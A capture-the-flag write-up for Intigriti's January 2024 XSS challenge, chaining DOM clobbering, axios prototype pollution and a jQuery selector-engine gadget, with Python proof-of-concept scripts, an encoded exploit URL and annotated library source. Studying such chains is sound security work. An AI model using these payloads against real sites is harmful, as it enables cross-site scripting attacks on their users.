# Intigriti 0124 Chall Writeup (Intended Solution)

### Author: Disna

## tl;dr
DOM clobbering into prototype pollution (PP) into PP gadget discovery

## Background

I spent the last week poking at @Kevin_Mizu's Intigriti challenge for Jan. 2024. While the challenge was open, no one had solved it the intended way; instead, while people correctly abused the dom clobbering vulnerability to trigger prototype pollution (as was hinted at by Intigriti's tweets _here_ and _here_), all solutions (mine included) instead abused a `for ... in ...` loop while jQuery iterated over a list of HTML attributes to set, injecting either `onload` or `srcdoc` attributes against an `iframe` to trigger xss.


```html
<iframe id="homepage" hidden></iframe>
```
```javascript
if (repo.homepage && repo.homepage.startsWith("https://")) {
    $("#homepage").attr({
        "src": repo.homepage,
        "hidden": false
    });
};
```
_vulnerable code in question_

```python
def main():
    r = requests.get(f"{CHALL_URL}/", params={
        "name": f"""
<form id="search">
    <input name="q" value="shouldnotmatchanyrepo" />
    <input name="__proto__[srcdoc]" value="{('<script>alert(document.domain)</script>')}" />
    <input name="__proto__[srcdoc]" value="placeholder" />
    <input name="__proto__[owner]" value="placeholder2" />
    <input name="__proto__[homepage]" value="https://example.com" />
</form>
""".strip(),
        "search": f"""a"""
    })
    print(r.url)
```
_my POC at the time_
<details>
<summary><i>explanation of the original exploit</i></summary>

For starters, replace the minified versions of the client-side scripts with their unminified versions; this makes stepping through them DevTools a far better experience.

DOM clobbering: the server sticks any input of your choosing in the `name` query param into the output HTML at `/search` with `ejs`, though they sanitize it with DOMPurify. `SANITIZE_DOM` is explicitly disabled, which enables DOM clobbering.

```js
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
```
_app.js_

```html
<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>
```
_search.ejs_

Prototype pollution: the client runs `axios` 1.6.2, which is known to contain a prototype pollution vulnerability in `formDataToJSON()`. As it so happens, `search.ejs` runs this:

```js
        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
```

_sending the first encountered element with ID `search` to axios, which runs it through the aforementioned function if it's a `formData` object_

So, triggering prototype pollution just requires us to inject a `form` element with `id=search`, with `input` elements whose names and values correspond to the attributes that we want to pollute.

As it turns out, if you have a bunch of polluted attributes in a prototype, when you iterate over an object with that prototype, a `for ... in ...` loop will first look up the attributes in the current object, before enumerating over attributes in the prototype chain. `attr()`, in `jQuery` code, loops over each key, value pair of the object it's given, and so if you pollute, say, `srcdoc`, you'll effectively give `attr` the following object:

```js
if (repo.homepage && repo.homepage.startsWith("https://")) {
    $("#homepage").attr({
        "src": repo.homepage,
        "hidden": false,
        "srcdoc": "your_payload",
    });
};
```

Now, there are two `srcdoc`'s in the payload, and that's because `formDataToJSON` will create an array if there are two values with duplicate keys. This is important to avoid a script error while executing `attr()`:

```js
attr: function( elem, name, value ) {
    ...
    if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
        hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
				( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
    }
    ...
        if ( hooks && "set" in hooks &&
        ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
            return ret;
        }
    ...
```
_`attr()` code snippets in question_

Because of our prototype pollution, `jQuery.attrHooks['srcdoc']` will return our polluted value, and if it is a string, `"set" in hooks` will error out. So, we want `srcdoc` to be an array instead, as long as the string representation of the array contains the payload we need to trigger xss.

`owner` and `homepage` are also polluted such that if the server returns an empty object, we control these two values, and they don't need to be transformed to arrays because `attr` will process attributes in its prototype in the order they're defined in, so by the time we'd error out at `"set" in jQuery.attrHooks['owner']`, `srcdoc` would have already been set, and the xss would have triggered already.

</details>


Welp, @Kevin_Mizu commented out the code that assigned attributes to `srcdoc` and [re-released the chall](https://vxtwitter.com/kevin_mizu/status/1747566277244387636), so we get to work.

## The gadget
<details closed>
<summary>The final exploit</summary>

```py
import requests

# CHALL_URL = "http://localhost:3000"
CHALL_URL = "http://mizu.re:3000"

def main():
    r = requests.get(f"{CHALL_URL}/", params={
        "name": f"""
<form name="ownerDocument"><input type="text" id="documentElement" value="lol"></form>
<form id="search">
    <input name="q" value="nonvalue" />
    <input name="__proto__.selector" value="img.loading" />
    <input name="__proto__.CLASS.dir" value="parentNode" />
    <input name="__proto__.TAG.dir" value="parentNode" />
    <input name="__proto__.owner.avatar_url" value="javascript:alert(document.domain)" />
</form>
""".strip(),
        "search": f"""a"""
    })
    print(r.url)
    
if __name__ == "__main__":
    main()
```

`http://mizu.re:3000/?name=%3Cform+name%3D%22ownerDocument%22%3E%3Cinput+type%3D%22text%22+id%3D%22documentElement%22+value%3D%22lol%22%3E%3C%2Fform%3E%0A%3Cform+id%3D%22search%22%3E%0A++++%3Cinput+name%3D%22q%22+value%3D%22nonvalue%22+%2F%3E%0A++++%3Cinput+name%3D%22__proto__.selector%22+value%3D%22img.loading%22+%2F%3E%0A++++%3Cinput+name%3D%22__proto__.CLASS.dir%22+value%3D%22parentNode%22+%2F%3E%0A++++%3Cinput+name%3D%22__proto__.TAG.dir%22+value%3D%22parentNode%22+%2F%3E%0A++++%3Cinput+name%3D%22__proto__.owner.avatar_url%22+value%3D%22javascript%3Aalert%281%29%22+%2F%3E%0A%3C%2Fform%3E&search=a`

</details>

At first, I looked at the few `jQuery` functions that were used in `search.ejs`. I figured that these probably contained the most interesting behavior that `jQuery` had to offer in terms of exploitability. Unfortunately, no dice:
```javascript
        $("img.loading").attr("hidden", false);
        ...
            $("img.loading").attr("hidden", true);
            ...
            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            ...
                // $("#homepage").attr({
                //     "src": repo.homepage,
                //     "hidden": false
                // });
        ...
        ...
        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
```
_`attr()`, `text()` and `submit()` all turned out to be quite innocuous_

As it turned out, the gadget ended up being in the `$('selector')` call.
<details open>
<summary>$("selector") calls init(selector), whose function body is below:</summary>

```javascript
	init = jQuery.fn.init = function( selector, context, root ) {
		var match, elem;

		// HANDLE: $(""), $(null), $(undefined), $(false)
		if ( !selector ) {
			return this;
		}

		// Method init() accepts an alternate rootjQuery
		// so migrate can support jQuery.sub (gh-2101)
		root = root || rootjQuery;

		// Handle HTML strings
		if ( typeof selector === "string" ) {
			if ( selector[ 0 ] === "<" &&
				selector[ selector.length - 1 ] === ">" &&
				selector.length >= 3 ) {

				// Assume that strings that start and end with <> are HTML and skip the regex check
				match = [ null, selector, null ];

			} else {
                /*
	            rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/
                We don't control selector, and it only ever receives
                selectors of the form `#idname` or `tag.class`

                For #idname, match = ['#idname', undefined, 'idname']

                For tag.class, match = null
                */
				match = rquickExpr.exec( selector );
			}

			// Match html or make sure no context is specified for #id
            // WP: #idname will always hit this branch
            // WP: neither match[1] nor context are pollutable
			if ( match && ( match[ 1 ] || !context ) ) {

				// HANDLE: $(html) -> $(array)
                // WP: we never walk this branch
				if ( match[ 1 ] ) {
					context = context instanceof jQuery ? context[ 0 ] : context;

					// Option to run scripts is true for back-compat
					// Intentionally let the error be thrown if parseHTML is not present
					jQuery.merge( this, jQuery.parseHTML(
						match[ 1 ],
						context && context.nodeType ? context.ownerDocument || context : document,
						true
					) );

					// HANDLE: $(html, props)
					if ( rsingleTag.test( match[ 1 ] ) && jQuery.isPlainObject( context ) ) {
						for ( match in context ) {

							// Properties of context are called as methods if possible
							if ( isFunction( this[ match ] ) ) {
								this[ match ]( context[ match ] );

							// ...and otherwise set as attributes
							} else {
								this.attr( match, context[ match ] );
							}
						}
					}

					return this;

				// HANDLE: $(#id)
                // WP: #idname always walks this branch
				} else {
                    // WP: unfortunately, not useful
					elem = document.getElementById( match[ 2 ] );

					if ( elem ) {

						// Inject the element directly into the jQuery object
						this[ 0 ] = elem;
						this.length = 1;
					}
					return this;
				}

			// HANDLE: $(expr, $(...))
            // WP: tag.class will always hit this branch
			} else if ( !context || context.jquery ) {
				return ( context || root ).find( selector );

			// HANDLE: $(expr, context)
			// (which is just equivalent to: $(context).find(expr)
			} else {
				return this.constructor( context ).find( selector );
			}

		// HANDLE: $(DOMElement)
		} else if ( selector.nodeType ) {
			this[ 0 ] = selector;
			this.length = 1;
			return this;

		// HANDLE: $(function)
		// Shortcut for document ready
		} else if ( isFunction( selector ) ) {
			return root.ready !== undefined ?
				root.ready( selector ) :

				// Execute immediately if ready is not present
				selector( jQuery );
		}

		return jQuery.makeArray( selector, this );
	};
```
</details>

The process from here on out was:
1. Determine what code path we're currently following (stepping with DevTools, essentially), without pollution
2. Identify any prototype pollution sinks in the code
3. Find out if abusing any of the prototype pollution sinks allows us to traverse new code paths

None of the behavior from `$('#description')` call ended up being interesting, whereas `$('img.loading')` and `$('img.avatar')` would land us in the `(context || root).find(selector)` call. If we can get a `<script>` element to be returned from these calls, then in the `$('img.avatar').attr('src', owner.avatar_url)` we can trigger XSS.

<details closed>
<summary>find(selector) function body</summary>

```javascript
function find( selector, context, results, seed ) {
	var m, i, elem, nid, match, groups, newSelector,
        // ownerDocument pollutable, but I did not find it very useful
		newContext = context && context.ownerDocument,

		// nodeType defaults to 9, since context defaults to document
		nodeType = context ? context.nodeType : 9;

	results = results || [];

	// Return early from calls with invalid selector or context
	if ( typeof selector !== "string" || !selector ||
		nodeType !== 1 && nodeType !== 9 && nodeType !== 11 ) {

		return results;
	}

	// Try to shortcut find operations (as opposed to filters) in HTML documents
	if ( !seed ) {
		setDocument( context );
		context = context || document;

        // WP: clobberable; see explanation below
		if ( documentIsHTML ) {

			// If the selector is sufficiently simple, try using a "get*By*" DOM method
			// (excepting DocumentFragment context, where the methods don't exist)
            // WP: this check is always false
			if ( nodeType !== 11 && ( match = rquickExpr.exec( selector ) ) ) {

				// ID selector
				if ( ( m = match[ 1 ] ) ) {

					// Document context
					if ( nodeType === 9 ) {
						if ( ( elem = context.getElementById( m ) ) ) {

							// Support: IE 9 only
							// getElementById can match elements by name instead of ID
							if ( elem.id === m ) {
								push.call( results, elem );
								return results;
							}
						} else {
							return results;
						}

					// Element context
					} else {

						// Support: IE 9 only
						// getElementById can match elements by name instead of ID
						if ( newContext && ( elem = newContext.getElementById( m ) ) &&
							find.contains( context, elem ) &&
							elem.id === m ) {

							push.call( results, elem );
							return results;
						}
					}

				// Type selector
				} else if ( match[ 2 ] ) {
					push.apply( results, context.getElementsByTagName( selector ) );
					return results;

				// Class selector
				} else if ( ( m = match[ 3 ] ) && context.getElementsByClassName ) {
					push.apply( results, context.getElementsByClassName( m ) );
					return results;
				}
			}

			// Take advantage of querySelectorAll
			// this check is always true
			if ( !nonnativeSelectorCache[ selector + " " ] &&
				( !rbuggyQSA || !rbuggyQSA.test( selector ) ) ) {

				newSelector = selector;
				newContext = context;

				// qSA considers elements outside a scoping root when evaluating child or
				// descendant combinators, which is not what we want.
				// In such cases, we work around the behavior by prefixing every selector in the
				// list with an ID selector referencing the scope context.
				// The technique has to be used as well when a leading combinator is used
				// as such selectors are not recognized by querySelectorAll.
				// Thanks to Andrew Dupont for this technique.
				if ( nodeType === 1 &&
					( rdescend.test( selector ) || rleadingCombinator.test( selector ) ) ) {

					// Expand context for sibling selectors
					newContext = rsibling.test( selector ) && testContext( context.parentNode ) ||
						context;

					// We can use :scope instead of the ID hack if the browser
					// supports it & if we're not changing the context.
					// Support: IE 11+, Edge 17 - 18+
					// IE/Edge sometimes throw a "Permission denied" error when
					// strict-comparing two documents; shallow comparisons work.
					// eslint-disable-next-line eqeqeq
					if ( newContext != context || !support.scope ) {

						// Capture the context ID, setting it first if necessary
						if ( ( nid = context.getAttribute( "id" ) ) ) {
							nid = jQuery.escapeSelector( nid );
						} else {
							context.setAttribute( "id", ( nid = expando ) );
						}
					}

					// Prefix every selector in the list
					groups = tokenize( selector );
					i = groups.length;
					while ( i-- ) {
						groups[ i ] = ( nid ? "#" + nid : ":scope" ) + " " +
							toSelector( groups[ i ] );
					}
					newSelector = groups.join( "," );
				}

				try {
					push.apply( results,
						newContext.querySelectorAll( newSelector )
					);
					return results;
				} catch ( qsaError ) {
					nonnativeSelectorCache( selector, true );
				} finally {
					if ( nid === expando ) {
						context.removeAttribute( "id" );
					}
				}
			}
		}
	}

	// All others
	return select( selector.replace( rtrimCSS, "$1" ), context, results, seed );
}
```

</details>

The default path that `find('img.avatar')` took landed us in this branch:
```js
			if ( !nonnativeSelectorCache[ selector + " " ] &&
				( !rbuggyQSA || !rbuggyQSA.test( selector ) ) ) {
```
Now, `nonnativeSelectorCache` _could_ have been pollutable, but Axios does not allow any whitespaces in its property names when converting an attr name like `__proto__.x` to JSON, and so we aren't able to pollute this object. Therefore, the only way to avoid this branch is to modify the `documentIsHTML` attribute.

We can do this when `jQuery` first calls `setDocument()`, through dom clobbering:

<details>
<summary>setDocument() and isXMLDoc()</summary>

```js
function setDocument( node ) {
	var subWindow,
		doc = node ? node.ownerDocument || node : preferredDoc;

	// Return early if doc is invalid or already selected
	// Support: IE 11+, Edge 17 - 18+
	// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
	// two documents; shallow comparisons work.
	// eslint-disable-next-line eqeqeq
	if ( doc == document || doc.nodeType !== 9 || !doc.documentElement ) {
		return document;
	}

	// Update global variables
	document = doc;
	documentElement = document.documentElement;
	documentIsHTML = !jQuery.isXMLDoc( document );
	...

isXMLDoc: function( elem ) {
	var namespace = elem && elem.namespaceURI,
		docElem = elem && ( elem.ownerDocument || elem ).documentElement;

	// Assume HTML when documentElement doesn't yet exist, such as inside
	// document fragments.
	return !rhtmlSuffix.test( namespace || docElem && docElem.nodeName || "HTML" );
},
```

</details>

`setDocument(document)` calls `documentIsHTML = !jQuery.isXMLDoc(document)`, and because we have a DOM clobbering vulnerability, we can influence the value of `document.namespaceURI` and `document.ownerDocument` through forms, so we set it to any random value that is not `HTML`, to set `documentIsHTML` to false. In `find(selector)`, this ends up calling `return select( selector.replace( rtrimCSS, "$1" ), context, results, seed )`.

<details>
<summary>select() function body</summary>

```js
function select( selector, context, results, seed ) {
	var i, tokens, token, type, find,
		compiled = typeof selector === "function" && selector,
		match = !seed && tokenize( ( selector = compiled.selector || selector ) );

	results = results || [];

	// Try to minimize operations if there is only one selector in the list and no seed
	// (the latter of which guarantees us context)
	if ( match.length === 1 ) {

		// Reduce context if the leading compound selector is an ID
		tokens = match[ 0 ] = match[ 0 ].slice( 0 );
		if ( tokens.length > 2 && ( token = tokens[ 0 ] ).type === "ID" &&
				context.nodeType === 9 && documentIsHTML && Expr.relative[ tokens[ 1 ].type ] ) {

			context = ( Expr.find.ID(
				token.matches[ 0 ].replace( runescape, funescape ),
				context
			) || [] )[ 0 ];
			if ( !context ) {
				return results;

			// Precompiled matchers will still verify ancestry, so step up a level
			} else if ( compiled ) {
				context = context.parentNode;
			}

			selector = selector.slice( tokens.shift().value.length );
		}

		// Fetch a seed set for right-to-left matching
		i = matchExpr.needsContext.test( selector ) ? 0 : tokens.length;
		while ( i-- ) {
			token = tokens[ i ];

			// Abort if we hit a combinator
			if ( Expr.relative[ ( type = token.type ) ] ) {
				break;
			}
			if ( ( find = Expr.find[ type ] ) ) {

				// Search, expanding context for leading sibling combinators
				if ( ( seed = find(
					token.matches[ 0 ].replace( runescape, funescape ),
					rsibling.test( tokens[ 0 ].type ) &&
						testContext( context.parentNode ) || context
				) ) ) {

					// If seed is empty or no tokens remain, we can return early
					tokens.splice( i, 1 );
					selector = seed.length && toSelector( tokens );
					if ( !selector ) {
						push.apply( results, seed );
						return results;
					}

					break;
				}
			}
		}
	}

	// Compile and execute a filtering function if one is not provided
	// Provide `match` to avoid retokenization if we modified the selector above
	( compiled || compile( selector, match ) )(
		seed,
		context,
		!documentIsHTML,
		results,
		!context || rsibling.test( selector ) && testContext( context.parentNode ) || context
	);
	return results;
}
```

</details>

While `compiled` is undefined and therefore, `compiled.selector` looks like a really attractive target in `tokenize( ( selector = compiled.selector || selector ) )`, having any polluted variable on the Object prototype ended up breaking `tokenize` entirely.

<details closed>
<summary>Failed gadget attempt: compile.selector</summary>

```js
function tokenize( selector, parseOnly ) {
	var matched, match, tokens, type,
		soFar, groups, preFilters,
		cached = tokenCache[ selector + " " ];

	if ( cached ) {
		return parseOnly ? 0 : cached.slice( 0 );
	}

	soFar = selector;
	groups = [];
	preFilters = Expr.preFilter;

	while ( soFar ) {

		// Comma and first run
		if ( !matched || ( match = rcomma.exec( soFar ) ) ) {
			if ( match ) {

				// Don't consume trailing commas as valid
				soFar = soFar.slice( match[ 0 ].length ) || soFar;
			}
			groups.push( ( tokens = [] ) );
		}

		matched = false;

		// Combinators
		if ( ( match = rleadingCombinator.exec( soFar ) ) ) {
			matched = match.shift();
			tokens.push( {
				value: matched,

				// Cast descendant combinators to space
				type: match[ 0 ].replace( rtrimCSS, " " )
			} );
			soFar = soFar.slice( matched.length );
		}

		// Filters
		for ( type in Expr.filter ) {
			if ( ( match = matchExpr[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
				( match = preFilters[ type ]( match ) ) ) ) {
				matched = match.shift();
				tokens.push( {
					value: matched,
					type: type,
					matches: match
				} );
				soFar = soFar.slice( matched.length );
			}
		}

		if ( !matched ) {
			break;
		}
	}

	// Return the length of the invalid excess
	// if we're just parsing
	// Otherwise, throw an error or return tokens
	if ( parseOnly ) {
		return soFar.length;
	}

	return soFar ?
		find.error( selector ) :

		// Cache the tokens
		tokenCache( selector, groups ).slice( 0 );
}
```

As seen earlier, we cannot pollute `tokenCache[selector + ' ']` because of axios. We do control `selector` entirely, so this would have been promising, but in the main `while` loop, _this_ happens:

```js
		for ( type in Expr.filter ) {
			if ( ( match = matchExpr[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
				( match = preFilters[ type ]( match ) ) ) ) {
				matched = match.shift();
				tokens.push( {
					value: matched,
					type: type,
					matches: match
				} );
				soFar = soFar.slice( matched.length );
			}
		}
```
_hrnghhhhhh_

Since a `for ... in ...` loop also loops through an object's prototype variables as well, and because `Expr.filter`'s prototype is the `Object` prototype, any extra properties are to go through `matchExpr[type].exec(soFar)`, and as we can only insert strings (or `File` objects, since `form`'s can contain these), calling `.exec()` on them is going to throw an error.

(For what it's worth, you might have noticed that this loop does _not_ go through variables like `__defineGetter__`, which already exist on the prototype by default. This is because these default properties are not [enumerable](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Enumerability_and_ownership_of_properties). I haven't found a way to influence this either with prototype pollution.)

It _could_ have been possible if we are able to just influence `Boolean.prototype`, since `for (type in Expr.filter)` won't see that, but we can only insert strings and `File`'s, and none of these objects, their properties or prototypes contain booleans. big rip

</details>

As such, we can only take advantage of the fact that, due to `documentIsHTML` being false, `tokenize()` gets called once before any prototype pollution happens in `$('img.loading').attr("hidden", false)`. This sets `tokenCache['img.loading' + ' ']`, and so we pollute `Object.prototype.selector = 'img.loading'` to get past this call while still allowing other polluted variables through.

This means that we do not control `results` or `tokens`, and that makes most of the functionality in `select()` not exploitable. Instead, we can pollute either `Object.prototype.CLASS` or `Object.prototype.TAG` to break the main `while` loop, and call `compile(selector, match)(seed, context, !documentIsHTML, results, ...)`

```js
		while ( i-- ) {
			token = tokens[ i ];

			// Abort if we hit a combinator
			if ( Expr.relative[ ( type = token.type ) ] ) {
				break;
			}
			...

		( compiled || compile( selector, match ) )(
		seed,
		context,
		!documentIsHTML,
		results,
		!context || rsibling.test( selector ) && testContext( context.parentNode ) || context
	);
	return results;
```

<details closed>
<summary>compile() and matcherFromTokens()</summary>

```js
function compile( selector, match /* Internal Use Only */ ) {
	var i,
		setMatchers = [],
		elementMatchers = [],
		cached = compilerCache[ selector + " " ];

	if ( !cached ) {

		// Generate a function of recursive functions that can be used to check each element
		if ( !match ) {
			match = tokenize( selector );
		}
		i = match.length;
		while ( i-- ) {
			cached = matcherFromTokens( match[ i ] );
			if ( cached[ expando ] ) {
				setMatchers.push( cached );
			} else {
				elementMatchers.push( cached );
			}
		}

		// Cache the compiled function
		cached = compilerCache( selector,
			matcherFromGroupMatchers( elementMatchers, setMatchers ) );

		// Save selector and tokenization
		cached.selector = selector;
	}
	return cached;
}
```

```js
function matcherFromTokens( tokens ) {
	var checkContext, matcher, j,
		len = tokens.length,
		leadingRelative = Expr.relative[ tokens[ 0 ].type ],
		implicitRelative = leadingRelative || Expr.relative[ " " ],
		i = leadingRelative ? 1 : 0,

		// The foundational matcher ensures that elements are reachable from top-level context(s)
		matchContext = addCombinator( function( elem ) {
			return elem === checkContext;
		}, implicitRelative, true ),
		matchAnyContext = addCombinator( function( elem ) {
			return indexOf.call( checkContext, elem ) > -1;
		}, implicitRelative, true ),
		matchers = [ function( elem, context, xml ) {

			// Support: IE 11+, Edge 17 - 18+
			// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
			// two documents; shallow comparisons work.
			// eslint-disable-next-line eqeqeq
			var ret = ( !leadingRelative && ( xml || context != outermostContext ) ) || (
				( checkContext = context ).nodeType ?
					matchContext( elem, context, xml ) :
					matchAnyContext( elem, context, xml ) );

			// Avoid hanging onto element
			// (see https://github.com/jquery/sizzle/issues/299)
			checkContext = null;
			return ret;
		} ];

	for ( ; i < len; i++ ) {
		if ( ( matcher = Expr.relative[ tokens[ i ].type ] ) ) {
			matchers = [ addCombinator( elementMatcher( matchers ), matcher ) ];
		} else {
			matcher = Expr.filter[ tokens[ i ].type ].apply( null, tokens[ i ].matches );

			// Return special upon seeing a positional matcher
			if ( matcher[ expando ] ) {

				// Find the next relative operator (if any) for proper handling
				j = ++i;
				for ( ; j < len; j++ ) {
					if ( Expr.relative[ tokens[ j ].type ] ) {
						break;
					}
				}
				return setMatcher(
					i > 1 && elementMatcher( matchers ),
					i > 1 && toSelector(

						// If the preceding token was a descendant combinator, insert an implicit any-element `*`
						tokens.slice( 0, i - 1 )
							.concat( { value: tokens[ i - 2 ].type === " " ? "*" : "" } )
					).replace( rtrimCSS, "$1" ),
					matcher,
					i < j && matcherFromTokens( tokens.slice( i, j ) ),
					j < len && matcherFromTokens( ( tokens = tokens.slice( j ) ) ),
					j < len && toSelector( tokens )
				);
			}
			matchers.push( matcher );
		}
	}

	return elementMatcher( matchers );
}
```
</details>

Still can't influence the result of `tokenize()`. We do end up using PP to change the behavior of `matcherFromTokens()` though:

```js
	for ( ; i < len; i++ ) {
		if ( ( matcher = Expr.relative[ tokens[ i ].type ] ) ) {
			matchers = [ addCombinator( elementMatcher( matchers ), matcher ) ];
		} else {
			matcher = Expr.filter[ tokens[ i ].type ].apply( null, tokens[ i ].matches );
```
_vulnerable snippet_

```json
[
	{
		"value":"img",
		"type":"TAG",
		"matches":["img"]
	},
	{
		"value":".loading",
		"type":"CLASS",
		"matches":["loading"]
	}
]
```
_our tokens_

We do _not_ want to hit `matcher = Expr.filter[tokens[i].type].apply(...)`. We only have two tokens, and none of them match the `<script>` tags on page. So, we pollute both `TAG` and `CLASS` to avoid this, each set equal to `{'dir': 'parentNode'}`.

(You might also notice that `matcher[expando]` looks interesting, but `expando` turns out to be randomized using `Math.random()`. This is not only not guessable, but we don't have any `Math.random()` output on the page either, so we can't predict what the PRNG will give us. Because of site isolation, we can't predict this across origins either.)

<details closed>
<summary>addCombinator</summary>

```js
function addCombinator( matcher, combinator, base ) {
	var dir = combinator.dir,
		skip = combinator.next,
		key = skip || dir,
		checkNonElements = base && key === "parentNode",
		doneName = done++;

	return combinator.first ?

		// Check against closest ancestor/preceding element
		function( elem, context, xml ) {
			while ( ( elem = elem[ dir ] ) ) {
				if ( elem.nodeType === 1 || checkNonElements ) {
					return matcher( elem, context, xml );
				}
			}
			return false;
		} :

		// Check against all ancestor/preceding elements
		function( elem, context, xml ) {
			var oldCache, outerCache,
				newCache = [ dirruns, doneName ];

			// We can't set arbitrary data on XML nodes, so they don't benefit from combinator caching
			if ( xml ) {
				while ( ( elem = elem[ dir ] ) ) {
					if ( elem.nodeType === 1 || checkNonElements ) {
						if ( matcher( elem, context, xml ) ) {
							return true;
						}
					}
				}
			} else {
				... // not important because xml is true anyways
			}
			return false;
		};
}
```

</details>

<details>
<summary>matcherFromGroupMatchers()</summary>

```js
function matcherFromGroupMatchers( elementMatchers, setMatchers ) {
	var bySet = setMatchers.length > 0,
		byElement = elementMatchers.length > 0,
		superMatcher = function( seed, context, xml, results, outermost ) {
			var elem, j, matcher,
				matchedCount = 0,
				i = "0",
				unmatched = seed && [],
				setMatched = [],
				contextBackup = outermostContext,

				// We must always have either seed elements or outermost context
				elems = seed || byElement && Expr.find.TAG( "*", outermost ),

				// Use integer dirruns iff this is the outermost matcher
				dirrunsUnique = ( dirruns += contextBackup == null ? 1 : Math.random() || 0.1 ),
				len = elems.length;

			if ( outermost ) {

				// Support: IE 11+, Edge 17 - 18+
				// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
				// two documents; shallow comparisons work.
				// eslint-disable-next-line eqeqeq
				outermostContext = context == document || context || outermost;
			}

			// Add elements passing elementMatchers directly to results
			// Support: iOS <=7 - 9 only
			// Tolerate NodeList properties (IE: "length"; Safari: <number>) matching
			// elements by id. (see trac-14142)
			for ( ; i !== len && ( elem = elems[ i ] ) != null; i++ ) {
				if ( byElement && elem ) {
					j = 0;

					// Support: IE 11+, Edge 17 - 18+
					// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
					// two documents; shallow comparisons work.
					// eslint-disable-next-line eqeqeq
					if ( !context && elem.ownerDocument != document ) {
						setDocument( elem );
						xml = !documentIsHTML;
					}
					while ( ( matcher = elementMatchers[ j++ ] ) ) {
						if ( matcher( elem, context || document, xml ) ) {
							push.call( results, elem );
							break;
						}
					}
					if ( outermost ) {
						dirruns = dirrunsUnique;
					}
				}

				// Track unmatched elements for set filters
				if ( bySet ) {

					// They will have gone through all possible matchers
					if ( ( elem = !matcher && elem ) ) {
						matchedCount--;
					}

					// Lengthen the array for every element, matched or not
					if ( seed ) {
						unmatched.push( elem );
					}
				}
			}

			// `i` is now the count of elements visited above, and adding it to `matchedCount`
			// makes the latter nonnegative.
			matchedCount += i;

			// Apply set filters to unmatched elements
			// NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount`
			// equals `i`), unless we didn't visit _any_ elements in the above loop because we have
			// no element matchers and no seed.
			// Incrementing an initially-string "0" `i` allows `i` to remain a string only in that
			// case, which will result in a "00" `matchedCount` that differs from `i` but is also
			// numerically zero.
			if ( bySet && i !== matchedCount ) {
				j = 0;
				while ( ( matcher = setMatchers[ j++ ] ) ) {
					matcher( unmatched, setMatched, context, xml );
				}

				if ( seed ) {

					// Reintegrate element matches to eliminate the need for sorting
					if ( matchedCount > 0 ) {
						while ( i-- ) {
							if ( !( unmatched[ i ] || setMatched[ i ] ) ) {
								setMatched[ i ] = pop.call( results );
							}
						}
					}

					// Discard index placeholder values to get only actual matches
					setMatched = condense( setMatched );
				}

				// Add matches to results
				push.apply( results, setMatched );

				// Seedless set matches succeeding multiple successful matchers stipulate sorting
				if ( outermost && !seed && setMatched.length > 0 &&
					( matchedCount + setMatchers.length ) > 1 ) {

					jQuery.uniqueSort( results );
				}
			}

			// Override manipulation of globals by nested matchers
			if ( outermost ) {
				dirruns = dirrunsUnique;
				outermostContext = contextBackup;
			}

			return unmatched;
		};

	return bySet ?
		markFunction( superMatcher ) :
		superMatcher;
}
```

</details>

To understand what `addCombinator` does, we'll look into `matcherFromGroupMatchers()`, the function returned by `compile(selector, match)`. At a high level, it iterates over all HTML tags on the page, applying all matchers generated inside of `matcherFromTokens()`. In our case, since we polluted `TAG` and `CLASS`, the only matcher we have is:

```js
		matchContext = addCombinator( function( elem ) {
			return elem === checkContext;
		}, implicitRelative, true ),matchContext = addCombinator
		...
		matchers = [ function( elem, context, xml ) {
			// leadingRelative is an object, so
			// ret is just matchContext(elem, context, xml)
			var ret = ( !leadingRelative && ( xml || context != outermostContext ) ) || (
				( checkContext = context ).nodeType ?
					matchContext( elem, context, xml ) :
					matchAnyContext( elem, context, xml ) );

			// Avoid hanging onto element
			// (see https://github.com/jquery/sizzle/issues/299)
			checkContext = null;
			return ret;
		} ];
```

So, we will be calling the function that `addCombinator(HTMLElement, document, true)` returns on every HTML element, which in essence just does this:

```js
function addCombinator(matcher, combinator, base) {
	// we control dir through Expr.relative[token[i].type]
	var dir = combinator.dir,
	skip = combinator.next,
	key = skip || dir,
	checkNonElements = base && key === "parentNode",
		...
		return function(elem, context, xml) {	
			...
			if ( xml ) {
				while ( ( elem = elem[ dir ] ) ) {
					if ( elem.nodeType === 1 || checkNonElements ) {
						if ( matcher( elem, context, xml ) ) {
							return true;
						}
					}
				}
```

So, this is why we pollute `Object.prototype.CLASS.dir` to be `parentNode`, so we don't have to deal with `elem.nodeType === 1` (axios won't let us pollute properties with integer values, only strings and `File`'s). When we enter this function with a `<script>` element, we're just going to walk up the DOM tree in the `while` loop all the way to `document`, upon which `matcher(document, document, xml)` will return `true`. This is going to be the case for all elements on the page, and so the selector ends up returning a list of all HTML elements on the page.

Then in `$('img.avatar').attr('src', owner.avatar_url)`, we set the src of some `<script>` element on the page to our payload, triggering XSS.

Thanks again @Kevin_Mizu for a great chall! Had a lot of fun on this one.